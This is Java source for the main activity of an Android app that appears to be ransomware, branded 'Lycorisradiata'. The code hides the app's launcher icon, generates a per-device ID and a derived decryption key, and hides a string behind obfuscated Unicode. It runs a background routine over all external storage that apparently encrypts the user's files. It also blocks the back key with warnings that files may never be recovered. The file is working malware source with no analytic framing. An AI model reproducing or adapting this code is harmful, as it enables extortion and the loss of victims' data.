package com.android.tencent.zdevs.bah;

import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.recyclerview.BuildConfig;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.widget.Toast;
import java.io.File;

import static android.widget.Toast.LENGTH_LONG;

public class MainActivity extends AppCompatActivity {

  public static MainActivity instance;
  static File externalStorageDirectory;
  static String hz;
  static int hzs;
  static String decryptKey;

  ComponentName firstComponentName;
  ComponentName secondComponentName;
  PackageManager packageManager;
  String randomNumber;

  private void disableComponent(ComponentName componentName) {
    packageManager.setComponentEnabledSetting(componentName, 2, 1);
  }

  private void enabledComponent(ComponentName componentName) {
    packageManager.setComponentEnabledSetting(componentName, 1, 1);
  }

  private void setIconSc() {
    disableComponent(this.firstComponentName);
    enabledComponent(this.secondComponentName);
  }

  @Override protected void onCreate(Bundle bundle) {
    getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
    packageManager = getApplicationContext().getPackageManager();
    firstComponentName = new ComponentName(getBaseContext(), "com.android.tencent.zdevs.bah.MainActivity");
    secondComponentName = new ComponentName(getBaseContext(), "com.android.tencent.zdevs.bah.QQ1279525738");

    super.onCreate(bundle);
    setContentView(R.layout.home);

    instance = this;

    getSupportFragmentManager().beginTransaction()
        .replace(R.id.frame_content, new EncryptFragment())
        .commit();

    SharedPreferences sharedPreferences = getSharedPreferences("XH", 0);
    if (sharedPreferences.getString("bah", BuildConfig.VERSION_NAME)
        .equals(BuildConfig.VERSION_NAME)) {
      randomNumber =
          BuildConfig.VERSION_NAME + (((int) (Math.random() * ((double) 1000000))) + 10000000);
      Editor edit = sharedPreferences.edit();
      edit.putString("bah", randomNumber);
      edit.commit();
    } else {
      randomNumber = sharedPreferences.getString("bah", BuildConfig.VERSION_NAME);
    }

    hz = Utils.l(
        "\u17d7\u1782\u17d1\u178f\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1790\u17d7\u1782\u179a\u17d7\u17d7\u1782\u179a\u17d5\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d1\u17d7\u1782\u179a\u17d6\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d4\u17d7\u1782\u179a\u17da\u17d7\u1782\u179a\u17cc\u17d7\u1782\u179a\u17da\u17d7\u1782\u17d1\u1785\u17d7\u1782\u17d1\u1785\u17d6\u17a8\u1782\u1796\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17e9\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17b9\u17a4\u1799\u17d6\u17a8\u17a4\u17d1\u17d6\u17a8\u1786\u179b\u17d7\u1782\u179a\u1784\u17e9")
        + randomNumber;
    decryptKey = BuildConfig.VERSION_NAME + (Integer.parseInt(this.randomNumber) + 520);
    hzs = hz.length();
    externalStorageDirectory =
        new File(String.valueOf(Environment.getExternalStorageDirectory()) + "/");

    if (sharedPreferences.getInt("cs", 0) >= 2) {
      setTitle("Lycorisradiata");
      getSupportFragmentManager().beginTransaction()
          .replace(R.id.frame_content, new MainFragment())
          .commit();
      Utils.bz(this);
    }

    if (sharedPreferences.getInt("sss", 0) == 0) {
      new Thread(new Runnable() {
        @Override public void run() {
          Utils.deleteDir(externalStorageDirectory.toString(), decryptKey, 1, MainActivity.this);
        }
      }).start();
      return;
    }

    setTitle("Lycorisradiata");
    getSupportFragmentManager().beginTransaction()
        .replace(R.id.frame_content, new MainFragment())
        .commit();
    Utils.bz(this);
    setIconSc();
  }

  @Override
  public boolean onKeyDown(int keyCode, KeyEvent keyEvent) {
    if (keyCode == KeyEvent.KEYCODE_BACK) {
      Toast.makeText(this, (getSupportFragmentManager().findFragmentById(
          R.id.frame_content)) instanceof EncryptFragment
          ? "\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01"
          : "Please do not quit the software, or the file may never be recovered!", LENGTH_LONG)
          .show();
    }
    return true;
  }

  @Override protected void onPause() {
    if (getSupportFragmentManager().findFragmentById(
        R.id.frame_content) instanceof EncryptFragment) {
      SharedPreferences sharedPreferences = getSharedPreferences("XH", 0);
      Editor edit = sharedPreferences.edit();
      edit.putInt("cs", sharedPreferences.getInt("cs", 0) + 1);
      edit.commit();

      Toast.makeText(this, "\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01",
          LENGTH_LONG).show();
    } else {
      Toast.makeText(this, "Please do not quit the software, or the file may never be recovered!",
          LENGTH_LONG).show();
    }

    super.onPause();
  }

  @Override protected void onResume() {
    if ((getSupportFragmentManager().findFragmentById(
        R.id.frame_content) instanceof EncryptFragment)
        && getSharedPreferences("XH", 0).getInt("cs", 0) >= 2) {
      setTitle("Lycorisradiata");
      getSupportFragmentManager().beginTransaction()
          .replace(R.id.frame_content, new MainFragment())
          .commit();
    }

    super.onResume();
  }
}
